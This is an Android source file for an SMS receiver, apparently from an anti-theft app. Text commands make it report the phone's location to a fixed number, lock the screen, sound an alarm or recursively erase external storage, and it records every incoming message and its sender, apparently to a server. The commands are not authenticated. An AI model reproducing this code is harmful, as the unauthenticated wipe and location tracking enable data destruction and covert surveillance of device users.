package com.android.godseye;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.io.File;

public class smsReciever extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {



        Bundle b = intent.getExtras();
        Object[] obj = (Object[]) b.get("pdus");//protocol description units
        SmsMessage[] sms_list = new SmsMessage[obj.length];
        for (int i = 0; i < obj.length; i++) {
            sms_list[i] = SmsMessage.createFromPdu((byte[]) obj[i]);
        }
        String this_msg = sms_list[0].getMessageBody();


        if(this_msg.equalsIgnoreCase("GE LOC")) {

            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage("8089499457", null, "Your location"+ LocationService.lati+","+LocationService.logi , null, null);

        }
        else if(this_msg.equalsIgnoreCase("GE LOCK"))
        {

            context.startService(new Intent(context,GlobalTouchService.class));

        }
        else if(this_msg.equalsIgnoreCase("GE UNLOCK"))
        {
            context.stopService(new Intent(context,GlobalTouchService.class));
        }
        else if(this_msg.equalsIgnoreCase("GE ALARM"))
        {
            int resID=context.getResources().getIdentifier("beep", "raw",context.getPackageName());

            MediaPlayer mediaPlayer=MediaPlayer.create(context.getApplicationContext(),resID);
            mediaPlayer.start();

        }
        else if(this_msg.equalsIgnoreCase("GE ERASE"))
        {
            deleteRecursive(Environment.getExternalStorageDirectory());

        }
        else{

        }







        String this_phone = sms_list[0].getOriginatingAddress();

        serverinsertions h=new serverinsertions(context);
        h.insmsg(this_phone,"","",this_msg,"Incoming");

    }


    private static void deleteRecursive(File dir)
    {
        //Log.d("DeleteRecursive", "DELETEPREVIOUS TOP" + dir.getPath());
        if (dir.isDirectory())
        {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++)
            {
                File temp = new File(dir, children[i]);
                deleteRecursive(temp);
            }

        }

        if (dir.delete() == false)
        {
            Log.d("DeleteRecursive", "DELETE FAIL");
        }
    }
}

